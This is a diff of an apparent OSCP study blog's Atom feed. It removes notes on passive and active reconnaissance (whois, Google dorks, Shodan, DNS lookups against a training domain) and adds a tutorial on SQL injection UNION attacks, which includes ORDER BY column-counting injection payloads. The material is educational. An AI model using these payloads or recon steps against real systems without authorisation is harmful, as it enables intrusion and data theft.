@@ -1,430 +1,650 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Sphinx - MedSecure</title><link href="https://sfinx.kozow.com/" rel="alternate"></link><link href="https://sfinx.kozow.com/feeds/medsecure.atom.xml" rel="self"></link><id>https://sfinx.kozow.com/</id><updated>2024-05-09T02:09:00+01:00</updated><entry><title>Passive Enumeration</title><link href="https://sfinx.kozow.com/passive-enumeration.html" rel="alternate"></link><published>2024-05-09T02:09:00+01:00</published><updated>2024-05-09T02:09:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-09:/passive-enumeration.html</id><summary type="html">&lt;h3&gt;WHOIS Enumeration&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;whois&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-h&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;251&lt;/span&gt;
-&lt;span class="n"&gt;Domain&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;MEGACORPONE&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;COM&lt;/span&gt;
-&lt;span class="n"&gt;Registry&lt;/span&gt; &lt;span class="n"&gt;Domain&lt;/span&gt; &lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;1775445745_DOMAIN_COM-VRSN&lt;/span&gt;
-&lt;span class="n"&gt;Registrar&lt;/span&gt; &lt;span class="n"&gt;WHOIS&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;whois&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;
-&lt;span class="n"&gt;Registrar&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;://&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;
-&lt;span class="n"&gt;Updated&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;2019&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01T09&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;45&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;03Z&lt;/span&gt;
-&lt;span class="n"&gt;Creation&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;2013&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;22T23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;00Z&lt;/span&gt;
-&lt;span class="n"&gt;Registry&lt;/span&gt; &lt;span class="n"&gt;Expiry&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;2023&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01 …&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;WHOIS Enumeration&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;whois&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-h&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;251&lt;/span&gt;
-&lt;span class="n"&gt;Domain&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;MEGACORPONE&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;COM&lt;/span&gt;
-&lt;span class="n"&gt;Registry&lt;/span&gt; &lt;span class="n"&gt;Domain&lt;/span&gt; &lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;1775445745_DOMAIN_COM-VRSN&lt;/span&gt;
-&lt;span class="n"&gt;Registrar&lt;/span&gt; &lt;span class="n"&gt;WHOIS&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;whois&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;
-&lt;span class="n"&gt;Registrar&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;://&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;
-&lt;span class="n"&gt;Updated&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;2019&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01T09&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;45&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;03Z&lt;/span&gt;
-&lt;span class="n"&gt;Creation&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;2013&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;22T23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;00Z&lt;/span&gt;
-&lt;span class="n"&gt;Registry&lt;/span&gt; &lt;span class="n"&gt;Expiry&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;2023&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;22T23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;00Z&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;whois&lt;/span&gt; &lt;span class="n"&gt;38&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;100&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;193&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;70&lt;/span&gt; &lt;span class="n"&gt;-h&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;251&lt;/span&gt;
-&lt;span class="p"&gt;...&lt;/span&gt;
-&lt;span class="n"&gt;NetRange&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-&lt;span class="n"&gt;38&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;38&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;255&lt;/span&gt;
-&lt;span class="n"&gt;CIDR&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-&lt;span class="n"&gt;38&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Sphinx - MedSecure</title><link href="https://sfinx.kozow.com/" rel="alternate"></link><link href="https://sfinx.kozow.com/feeds/medsecure.atom.xml" rel="self"></link><id>https://sfinx.kozow.com/</id><updated>2024-05-19T21:05:00+01:00</updated><entry><title>SQL Injection UNION Attacks</title><link href="https://sfinx.kozow.com/2024/5/19/sqli-union/" rel="alternate"></link><published>2024-05-19T21:05:00+01:00</published><updated>2024-05-19T21:05:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/sqli-union/</id><summary type="html">&lt;h1&gt;SQL injection UNION attacks&lt;/h1&gt;
+&lt;h1&gt;OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION&lt;/h1&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-union/SQLI_UNION/union_based_sql_injection.png"&gt;&lt;/p&gt;
+&lt;p&gt;When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the ==UNION== keyword can be used to retrieve data from other tables within the database. This results in a SQL …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;SQL injection UNION attacks&lt;/h1&gt;
+&lt;h1&gt;OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION&lt;/h1&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-union/SQLI_UNION/union_based_sql_injection.png"&gt;&lt;/p&gt;
+&lt;p&gt;When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the ==UNION== keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.&lt;/p&gt;
+&lt;p&gt;The ==UNION== keyword lets you execute one or more additional ==SELECT== queries and append the results to the original query. For example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table2&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;h3&gt;Google Hacking&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;site:megacorpone.com&lt;/li&gt;
-&lt;li&gt;ext:php&lt;/li&gt;
-&lt;li&gt;filetype:html&lt;/li&gt;
-&lt;li&gt;intitle:"index of" "parent directory"&lt;/li&gt;
-&lt;li&gt;https://www.exploit-db.com/google-hacking-database&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;Netcraft&lt;/h3&gt;
-&lt;p&gt;Let’s review some of Netcraft’s capabilities. For example, we can use Netcraft’s DNS search page
-(https://searchdns.netcraft.com) to gather information about the megacorpone.com domain.&lt;/p&gt;
-&lt;h3&gt;Open-Source Code&lt;/h3&gt;
-&lt;p&gt;This includes open-source projects and online code repositories such as GitHub, GitHub Gist, GitLab, and SourceForge&lt;/p&gt;
-&lt;p&gt;Once we’ve logged in to our Github account, we can search MegaCorp One’s repos for interesting
-information. Let’s use filename:users to search for any files with the word “users” in the name.&lt;/p&gt;
-&lt;p&gt;For larger repos, we can use several tools to
-help automate some of the searching, such as Gitrob and Gitleaks. Most of these tools
-require an access tokento use the source code-hosting provider’s API.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Tools that search through source code for secrets, like Gitrob or Gitleaks,
-  generally rely on regular expressions or entropy233-based detections to identify
-  potentially useful information. Entropy-based detection attempts to find strings
-  that are randomly generated. The idea is that a long string of random characters
-  and numbers is probably a password. No matter how a tool searches for secrets,
-  no tool is perfect and they will miss things that a manual inspection might find.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3&gt;Shodan&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;hostname:megacorpone.com.&lt;/li&gt;
-&lt;li&gt;port:"22"&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;Security Headers and SSL/TLS&lt;/h3&gt;
-&lt;p&gt;One such site, Security Headers will analyze HTTP response headers and provide basic
-analysis of the target site’s security posture. We can use this to get an idea of an organization’s
-coding and security practices based on the results.
-Let’s scan www.megacorpone.com and check the results.&lt;/p&gt;</content><category term="OSCP"></category></entry><entry><title>Active Enumeration</title><link href="https://sfinx.kozow.com/active-enumeration.html" rel="alternate"></link><published>2024-05-08T21:00:00+01:00</published><updated>2024-05-08T21:00:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-08:/active-enumeration.html</id><summary type="html">&lt;h3&gt;DNS Enumeration&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;NS&lt;/strong&gt;: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;A&lt;/strong&gt;: Also known as a host record, the “a record” contains the IPv4 address of a hostname (such as www.megacorpone.com)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;AAAA&lt;/strong&gt;: Also known as a quad A host record …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h3&gt;DNS Enumeration&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;NS&lt;/strong&gt;: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;A&lt;/strong&gt;: Also known as a host record, the “a record” contains the IPv4 address of a hostname (such as www.megacorpone.com)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;AAAA&lt;/strong&gt;: Also known as a quad A host record, the “aaaa record” contains the IPv6 address of a hostname (such as www.megacorpone.com).&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;MX&lt;/strong&gt;: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;PTR&lt;/strong&gt;: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;CNAME&lt;/strong&gt;: Canonical Name Records are used to create aliases for other host records.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;TXT&lt;/strong&gt;: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;149&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;244&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;87&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;-t&lt;/span&gt; &lt;span class="n"&gt;mx&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;handled&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt; &lt;span class="n"&gt;fb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;handled&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;20&lt;/span&gt; &lt;span class="n"&gt;spool&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gandi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;handled&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;50&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;handled&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;60&lt;/span&gt; &lt;span class="n"&gt;mail2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;-t&lt;/span&gt; &lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;descriptive&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Try Harder&amp;quot;&lt;/span&gt;
-&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;descriptive&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;google-site-&lt;/span&gt;
-&lt;span class="s2"&gt;verification=U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA&amp;quot;&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;149&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;244&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;87&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;idontexist&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
-&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="n"&gt;idontexist&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NXDOMAIN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;p&gt;This SQL query will return a single result set with two columns, containing values from columns ==a== and ==b== in ==table1== and columns c and d in table2.
+For a ==UNION== query to work, two key requirements must be met:
+* The individual queries must return the same number of columns.
+* The data types in each column must be compatible between the individual queries.&lt;/p&gt;
+&lt;p&gt;⠀To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
+* How many columns are being returned from the original query?
+* Which columns returned from the original query are of a suitable data type to hold the results from the injected query?&lt;/p&gt;
+&lt;h2&gt;Determining the number of columns required in a SQL injection UNION attacks&lt;/h2&gt;
+&lt;p&gt;When performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.
+The first method involves injecting a series of ==ORDER BY== clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the ==WHERE== clause of the original query, you would submit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; ORDER BY 1--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;dig&lt;/span&gt; &lt;span class="nv"&gt;@nagoya&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nagoya-industries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;nagoya-industries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;
+&lt;p&gt;This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ==ORDER BY== clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;The ORDER BY position number 3 is out of range of the number of items in the select list.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
